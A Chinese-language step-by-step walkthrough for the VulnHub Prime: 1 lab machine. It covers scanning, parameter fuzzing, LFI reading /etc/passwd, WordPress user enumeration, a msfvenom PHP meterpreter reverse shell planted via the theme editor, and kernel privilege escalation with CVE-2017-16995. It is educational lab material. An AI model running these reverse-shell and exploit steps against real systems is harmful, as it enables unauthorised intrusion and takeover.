# VulnHub Prime: 1 靶机渗透复现学习指南

这份指南是基于 CSDN 文章 [保姆级讲解攻击vulnhub的prime1](https://blog.csdn.net/2601_95816162/article/details/161020751) 整理的复现步骤。通过这个实验，你将学习到从信息收集、Web 漏洞利用到 Linux 内核提权的完整渗透流程。

---

## 一、 核心技术栈

在开始之前，建议你对以下工具和概念有初步了解：

- **Kali Linux**: 渗透测试专用操作系统。
    
- **信息收集**: `nmap` (端口扫描), `dirsearch` (目录扫描)。
    
- **模糊测试**: `wfuzz` (参数爆破)。
    
- **CMS 漏洞利用**: `wpscan` (WordPress 扫描器)。
    
- **反弹 Shell**: `msfvenom` (木马生成) & `msfconsole` (监听)。
    
- **提权**: `searchsploit` (漏洞检索), 内核漏洞利用 (CVE-2017-16995)。
    

---

## 二、 环境搭建

1. **下载靶机**: 从 [VulnHub 官网](https://www.vulnhub.com/entry/prime-1,358/) 下载 Prime: 1 镜像。
    
2. **安装虚拟机**: 使用 VMware 或 VirtualBox 导入靶机。
    
3. **网络配置**:
    
    - 将 **Kali Linux** 和 **Prime 靶机** 都设置为 **NAT 模式** 或 **桥接模式**。
        
    - 确保两台机器在同一个子网内。
        
4. **验证连通性**: 在 Kali 中使用 `arp-scan -l` 或 `nmap -sn 192.168.x.0/24` 找到靶机的 IP 地址。
    

---

## 三、 复现步骤 (Step-by-Step)

### 第一步：主机发现与端口扫描

```
# 1. 扫描存活主机（假设网段是 192.168.85.0/24）
nmap -sn 192.168.85.0/24

# 2. 深度扫描靶机端口 (假设靶机 IP 为 192.168.85.133)
nmap -A -p- 192.168.85.133
```

**目标**: 确认开放了 80 (HTTP) 和 22 (SSH) 端口

### 第二步：Web 目录挖掘

```
# 使用 dirsearch 扫描目录，注意添加后缀
dirsearch -u http://192.168.85.133 -e php,txt,html
```

**关键发现**: 访问 `secret.txt`，它会提示你对某个 PHP 文件进行 Fuzz（模糊测试）。

### 第三步：参数爆破 (Fuzzing)

```
# 对 index.php 进行参数爆破
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 136 http://192.168.85.133/index.php?FUZZ=something
```

**注意**: `--hh 136` 是为了过滤掉无效的响应。你会发现参数 `file`。

### 第四步：文件包含 (LFI) 获取敏感信息

利用 `file` 参数读取文件：

1. 访问 `http://192.168.85.133/index.php?file=location.txt`。
    
2. 根据 `location.txt` 的提示，访问 `http://192.168.85.133/image.php?secrettier360=etc/passwd`。
    
3. 在 `/etc/passwd` 中找到用户 `saket` 及其相关的 `.txt` 密码文件路径。
    

### 第五步：WordPress 后台突破

1. 找到 WordPress 登录地址 (通常是 `/wordpress/wp-admin`)。
    
2. 使用 `wpscan` 枚举用户名: `wpscan --url http://192.168.85.133/wordpress/ --enumerate u`。
    
3. 使用第四步获取的密码登录 `victor` 用户的后台。
    

### 第六步：获取反弹 Shell

1. 在 Kali 上生成 PHP 反弹木马: `msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your_Kali_IP> LPORT=4444 -f raw`。
    
2. 在 WordPress 后台的 **Appearance -> Theme Editor** 中，选择一个 PHP 模板（如 `secret.php`），将木马代码粘贴进去。
    
3. 在 Kali 上开启监听: `msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST <Your_Kali_IP>; set LPORT 4444; exploit"`。
    
4. 浏览器访问修改后的 PHP 文件路径，触发反弹。
    

### 第七步：内核提权 (Root)

1. 查看系统内核版本: `uname -a` (发现是 Ubuntu 16.04)。
    
2. 搜索提权漏洞: `searchsploit Ubuntu 16.04 4.4.0`。
    
3. 下载并编译 CVE-2017-16995 (或类似的) 漏洞脚本。
    
4. 将编译好的二进制文件上传到靶机的 `/tmp` 目录并执行。
    

---

## 四、 避坑指南

1. **网卡适配器**: 如果扫不到 IP，请在虚拟机设置中检查网卡是否已连接，或尝试重置 MAC 地址。
    
2. **Wfuzz 过滤**: `wfuzz` 产生大量干扰项时，一定要看清楚返回的字符数 (Chars) 或词数 (Words)，用 `--hh` 或 `--hw` 进行过滤。
    
3. **PHP 标签**: 在 WordPress 后台植入木马时，确保代码包含在 `<?php ... ?>` 标签内。
    
4. **提权环境**: 靶机可能没有 `gcc`，请务必在 Kali 上使用 `gcc -static` 编译或寻找已经编译好的 exploit。
    

---

## 五、 学习建议

- **先自己动手**: 不要一边看文章一边做，尝试先自己探索 30 分钟，遇到瓶颈再查阅本指南。
    
- **理解原理**: 思考为什么 `wfuzz` 能找到参数？文件包含漏洞是如何形成的？
    
- **记录过程**: 养成写渗透测试报告的习惯，记录每一个成功的命令和发现。
    

祝你复现顺利！如有疑问，随时向我提问。